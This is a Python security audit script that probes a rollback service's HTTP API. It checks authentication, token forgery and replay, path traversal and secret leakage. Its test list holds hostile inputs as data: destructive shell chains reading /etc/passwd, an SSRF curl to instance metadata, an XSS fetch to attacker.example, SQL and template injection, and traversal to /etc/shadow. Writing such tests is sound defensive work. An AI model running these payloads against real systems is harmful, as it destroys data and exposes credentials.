"""Security audit runner for the Mercury rollback path.

Runs hostile inputs against the real HTTP surface and reports what the server
actually did with each one. It reports failures as failures and exits non-zero,
so it is a check rather than a demonstration.

What it verifies:
  1. Every operator state-changing route refuses an unauthenticated request.
  2. Hostile strings in a rollback payload are stored as opaque data and never
     interpolated into a shell, a template or a query.
  3. A governance token cannot be forged, replayed, retargeted, or made to apply
     to content that changed after it was minted.
  4. No response body leaks the deployment secret.

Usage:
    python scripts/security_audit.py
"""
from __future__ import annotations

import os
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT))

SECRET = "security-audit-secret"
os.environ["MERCURY_ROLLBACK_SECRET"] = SECRET
os.environ.setdefault("MERCURY_OFFLINE", "1")

from fastapi.testclient import TestClient  # noqa: E402

from src.domain.governed_rollback import mint_governance_token  # noqa: E402
from src.interfaces.mcp_server import app, deployment_evidence  # noqa: E402

AUTH = {"Authorization": f"Bearer {SECRET}"}
STATE_CHANGING = [
    "/mcp/tools/stage_rollback",
    "/mcp/tools/confirm_rollback",
    "/mcp/tools/record_deployment_evidence",
    "/mcp/tools/update_handoff",
    "/webhooks/github/workflow_run",
]
HOSTILE_STRINGS = [
    ("; rm -rf / ; cat /etc/passwd", "shell chaining"),
    ("$(curl http://169.254.169.254/latest/meta-data/)", "SSRF to instance metadata"),
    ("payments-api || sudo shutdown -h now", "command chaining"),
    ("<script>fetch('http://attacker.example')</script>", "cross-site scripting"),
    ("{{7*7}}", "server-side template injection"),
    ("DROP TABLE metrics; --", "SQL injection"),
    ("../../../../etc/shadow", "path traversal"),
    ("%00truncate", "null byte"),
]


class Audit:
    def __init__(self) -> None:
        self.failures: list[str] = []
        self.checks = 0

    def check(self, condition: bool, description: str, detail: str = "") -> None:
        self.checks += 1
        if condition:
            print(f"  [PASS] {description}")
        else:
            print(f"  [FAIL] {description}{(' -> ' + detail) if detail else ''}")
            self.failures.append(description)


def main() -> int:
    client = TestClient(app)
    audit = Audit()
    deployment_evidence.clear()

    deployed = datetime(2026, 9, 23, 8, tzinfo=timezone.utc)
    target_digest = "1" * 64
    incident_digest = "2" * 64
    for marker_id, revision, digest, when in (
        ("audit-good", "3e9d10c", target_digest, deployed),
        ("audit-current", "badc0de", incident_digest, deployed + timedelta(hours=1)),
    ):
        recorded = client.post("/mcp/tools/record_deployment_evidence", headers=AUTH, json={
            "marker_id": marker_id,
            "service": "checkout-api",
            "environment": "production",
            "revision": revision,
            "artifact_sha256": digest,
            "deployed_at": when.isoformat(),
            "health_checked_at": (when + timedelta(minutes=2)).isoformat(),
            "health_status": "HEALTHY",
            "health_observed_revision": revision,
            "health_observed_artifact_sha256": digest,
        })
        if recorded.status_code != 200:
            print(f"Could not seed deployment evidence: {recorded.text}")
            return 1

    def valid_stage(action_id: str, reason: str = "security audit") -> dict:
        return {
            "action_id": action_id,
            "target_service": "checkout-api",
            "target_commit_sha": "3e9d10c",
            "environment": "production",
            "target_artifact_sha256": target_digest,
            "target_deployment_marker_id": "audit-good",
            "offending_deployment_marker_id": "audit-current",
            "reason": reason,
        }

    print("=" * 70)
    print("  MERCURY SECURITY AUDIT")
    print("=" * 70)

    print("\n[1] Every operator state-changing route refuses an unauthenticated request")
    for route in STATE_CHANGING:
        response = client.post(route, json={})
        audit.check(response.status_code == 401, f"{route} without a bearer header returns 401",
                    f"got {response.status_code}")

    print("\n[2] A wrong secret is refused, and no response leaks the real one")
    wrong = client.post("/mcp/tools/stage_rollback", headers={"Authorization": "Bearer wrong"},
                        json={"action_id": "a", "target_service": "b", "target_commit_sha": "c", "reason": "d"})
    audit.check(wrong.status_code == 401, "a wrong bearer secret returns 401", f"got {wrong.status_code}")
    audit.check(SECRET not in wrong.text, "the 401 body does not contain the deployment secret")

    print("\n[3] Hostile reason strings are stored as opaque data, never executed")
    for index, (payload, label) in enumerate(HOSTILE_STRINGS):
        action_id = f"audit-{index:02d}"
        staged = client.post(
            "/mcp/tools/stage_rollback", headers=AUTH, json=valid_stage(action_id, payload)
        )
        ok = staged.status_code == 200
        audit.check(ok, f"{label} is accepted only as a content-bound reason",
                    f"status {staged.status_code}")

    print("\n[4] The code path contains no shell invocation for these fields")
    server_source = (REPO_ROOT / "src" / "interfaces" / "mcp_server.py").read_text(encoding="utf-8")
    domain_source = (REPO_ROOT / "src" / "domain" / "governed_rollback.py").read_text(encoding="utf-8")
    for name, source in [("interfaces", server_source), ("governance domain", domain_source)]:
        forbidden = [token for token in ["os.system", "shell=True", "eval(", "exec(", "subprocess.Popen"]
                     if token in source]
        audit.check(not forbidden, f"{name} invokes no shell or evaluator", str(forbidden))

    print("\n[5] Governance tokens cannot be forged, retargeted, replayed or re-scoped")

    def stage(action_id: str) -> dict:
        """Stage a fresh action. Each hostile attempt gets its own, because a
        refused confirmation deliberately burns the action it was aimed at."""
        return client.post(
            "/mcp/tools/stage_rollback", headers=AUTH, json=valid_stage(action_id)
        ).json()

    target = stage("audit-forge")
    forged = mint_governance_token("attacker-secret", "audit-forge", target["payload_hash"])
    response = client.post("/mcp/tools/confirm_rollback", headers=AUTH,
                           json={"action_id": "audit-forge", "governance_token": forged})
    audit.check(response.status_code == 403 and response.json()["detail"]["denial_reason"] == "BAD_SIGNATURE",
                "a token signed with another secret is refused", response.text[:120])
    followup = client.post("/mcp/tools/confirm_rollback", headers=AUTH,
                           json={"action_id": "audit-forge", "governance_token": target["governance_token"]})
    audit.check(followup.status_code == 409, "a forgery attempt burns the staged action, fail closed",
                followup.text[:120])

    stage("audit-arbitrary")
    response = client.post("/mcp/tools/confirm_rollback", headers=AUTH,
                           json={"action_id": "audit-arbitrary", "governance_token": "ALPHA-77"})
    audit.check(response.status_code == 400 and response.json()["detail"]["denial_reason"] == "MALFORMED_TOKEN",
                "an arbitrary string is not accepted as a token", response.text[:120])

    first_action = stage("audit-a")
    stage("audit-b")
    response = client.post("/mcp/tools/confirm_rollback", headers=AUTH,
                           json={"action_id": "audit-b", "governance_token": first_action["governance_token"]})
    audit.check(response.status_code == 403 and response.json()["detail"]["denial_reason"] == "TOKEN_ACTION_MISMATCH",
                "a token minted for another action is refused", response.text[:120])

    happy = stage("audit-happy")
    first = client.post("/mcp/tools/confirm_rollback", headers=AUTH,
                        json={"action_id": "audit-happy", "governance_token": happy["governance_token"]})
    audit.check(first.status_code == 200, "the legitimate confirmation succeeds", first.text[:120])
    replay = client.post("/mcp/tools/confirm_rollback", headers=AUTH,
                         json={"action_id": "audit-happy", "governance_token": happy["governance_token"]})
    audit.check(replay.status_code in (409, 403), "the same token cannot be used twice", replay.text[:120])

    print("\n[6] The cockpit asset route cannot be walked out of docs/")
    for probe in ["/..%2f..%2fREADME.md", "/%2e%2e%2fpyproject.toml", "/FRICTION_LOG.md",
                  "/static/FRICTION_LOG.md", "/static/index.html",
                  "/COMPLIANCE_AND_ARCHITECTURE.md", "/FIRE_TV_BUILD.md"]:
        response = client.get(probe)
        audit.check(response.status_code == 404, f"{probe} is refused", f"got {response.status_code}")

    print("\n" + "=" * 70)
    if audit.failures:
        print(f"  RESULT: {len(audit.failures)} of {audit.checks} checks FAILED")
        for failure in audit.failures:
            print(f"    - {failure}")
        print("=" * 70)
        return 1
    print(f"  RESULT: all {audit.checks} checks passed")
    print("=" * 70)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
